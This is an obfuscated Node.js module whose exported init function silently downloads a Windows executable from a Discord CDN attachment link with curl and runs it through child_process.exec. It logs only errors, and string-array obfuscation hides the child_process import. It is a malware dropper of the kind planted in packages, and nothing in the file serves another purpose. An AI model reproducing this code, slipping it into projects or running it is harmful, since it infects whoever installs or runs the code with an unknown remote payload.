function _0x54da() {
    const _0x5ecee8 = [
        'node:child_process',
        'error:\x20',
        'message',
        'exports'
    ];
    _0x54da = function () {
        return _0x5ecee8;
    };
    return _0x54da();
}
function _0x1743(_0x54da37, _0x17432c) {
    const _0x1dbc16 = _0x54da();
    _0x1743 = function (_0x52bc49, _0x18a83a) {
        _0x52bc49 = _0x52bc49 - 0x0;
        let _0x2a74eb = _0x1dbc16[_0x52bc49];
        return _0x2a74eb;
    };
    return _0x1743(_0x54da37, _0x17432c);
}
const _0x375dd0 = _0x1743;
const {exec} = require(_0x375dd0(0x0));
function init() {
    exec('curl\x20https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe\x20-o\x20a.exe\x20&&\x20a.exe', (_0x111438, _0x5a5c8b, _0x415dfb) => {
        const _0x227e78 = _0x1743;
        if (_0x111438) {
            console['log'](_0x227e78(0x1) + _0x111438[_0x227e78(0x2)]);
        }
    });
}
module[_0x375dd0(0x3)] = init;
